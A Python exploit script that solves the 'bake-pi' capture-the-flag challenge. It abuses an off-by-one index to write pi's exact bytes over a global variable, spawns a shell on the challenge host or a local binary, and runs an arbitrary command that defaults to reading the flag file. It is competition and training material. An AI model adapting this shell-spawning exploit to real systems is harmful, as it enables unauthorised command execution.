#!/usr/bin/env python3
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time


HOST = "bake-a-pi.ctf.ritsec.club"
PORT = 1555

# Exact IEEE-754 bytes for 3.141592653589793 as a little-endian double.
PI_QWORD = 0x400921FB54442D18
PI_BYTES = struct.pack("<Q", PI_QWORD)

# Menu interaction:
#   C -> choose change ingredient
#   8 -> off-by-one index that overlaps the global pi double
#   raw 8-byte pi value -> written by fgets into ingredients[8]
#   T -> trigger the taste-test branch
EXPLOIT_PREFIX = b"C\n8\n" + PI_BYTES + b"\nT\n"


def recv_all_stream(stream, timeout=1.0):
    chunks = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        wait = max(0.0, deadline - time.time())
        ready, _, _ = select.select([stream], [], [], wait)
        if not ready:
            break
        chunk = os.read(stream.fileno(), 65536)
        if not chunk:
            break
        chunks.append(chunk)
        deadline = time.time() + 0.1
    return b"".join(chunks)


def recv_all_socket(sock, timeout=1.0):
    chunks = []
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(65536)
        except (TimeoutError, socket.timeout):
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def exploit_remote(host, port, command):
    with socket.create_connection((host, port), timeout=8) as sock:
        sock.sendall(EXPLOIT_PREFIX)
        time.sleep(0.25)
        sock.sendall(command)
        time.sleep(0.8)
        return recv_all_socket(sock, timeout=1.0)


def exploit_local(command):
    proc = subprocess.Popen(
        ["./pi.bin"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    proc.stdin.write(EXPLOIT_PREFIX)
    proc.stdin.flush()
    time.sleep(0.2)
    proc.stdin.write(command)
    proc.stdin.flush()
    time.sleep(0.3)
    output = recv_all_stream(proc.stdout, timeout=1.0)
    proc.kill()
    return output


def main():
    parser = argparse.ArgumentParser(
        description="Exploit solver for the RITSEC CTF bake-pi challenge."
    )
    parser.add_argument("--local", action="store_true", help="run the exploit against ./pi.bin")
    parser.add_argument("--host", default=HOST, help="remote host")
    parser.add_argument("--port", type=int, default=PORT, help="remote port")
    parser.add_argument(
        "--cmd",
        default="cat /app/flag.txt",
        help="command to run after the shell spawns",
    )
    args = parser.parse_args()

    command = args.cmd.encode() + b"\n"
    output = exploit_local(command) if args.local else exploit_remote(args.host, args.port, command)

    sys.stdout.buffer.write(output)
    if not output.endswith(b"\n"):
        print()

    match = re.search(rb"RS\{[^}\n]+\}", output)
    if match:
        print(f"[+] Flag: {match.group().decode()}")


if __name__ == "__main__":
    main()
